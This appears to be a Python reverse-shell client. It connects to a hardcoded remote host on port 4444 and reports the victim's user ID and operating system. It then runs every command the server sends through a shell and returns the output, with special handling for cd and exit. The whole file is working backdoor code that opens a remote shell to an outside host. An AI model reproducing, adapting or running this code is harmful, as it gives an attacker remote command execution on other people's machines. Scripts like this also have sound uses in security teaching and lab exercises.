import socket
import subprocess
import os
import sys
import platform
import time

def inbound():
    while True:
        try:
            message = sock.recv(1024).decode()
            return message
        except Exception:
            sock.close()

def outbound(message):
    response = str(message).encode()
    sock.send(response)

def session_handler():
    print(f"[+] Connecting to {HOST_IP}...")
    sock.connect((HOST_IP, HOST_PORT))
    print(f"[+] Connected to {HOST_IP}.")
    outbound(f"Linux {os.getuid()}")
    print("sent admin infos")
    time.sleep(10)
    operating_system = platform.uname()
    operating_system = f"{operating_system[0]}{operating_system[2]}"
    outbound(operating_system)
    print(f"sent os infos : {operating_system}")
    while True:
        message = inbound()
        print(f"[+] Instruction recieved --> {message}")
        # case for handling exit command 
        if message == "exit":
            print("[-] The server has terminated this session.")
            sock.close()
            print("[-] Connection closed.")
            break
        # case for handling cd command
        elif message.split(" ")[0] == "cd":
            # cd without any arguments just prints the current directory
            if len(message.split(" ")) == 1:
                cur_dir = os.getcwd() + "\n"
                outbound(cur_dir)
            else:
                directory = str(message.split(" ")[1])
                try: 
                    os.chdir(directory)
                    cur_dir = os.getcwd() + "\n"
                    print(f"[+] Changed directory to {cur_dir}.")
                    outbound(cur_dir)
                except Exception:
                    outbound("Failed to change directory.\n")
        # case for handling the background command
        elif message.split(" ")[0] == "bg":
            pass
        # case for handling commands without arguments
        else:
            # encoding="oem" is for Windows encoding, remove parameter otherwise
            command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding="utf-8")
            output = command.stdout.read() + command.stderr.read()
            print(f"command to send : {output}")
            outbound(output)
            print("command sent.")

if __name__ == "__main__":
    try:
        HOST_IP = '172.17.176.1'
        HOST_PORT = 4444
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        session_handler()
    except Exception as error:
        print(f"An error occured : {error}")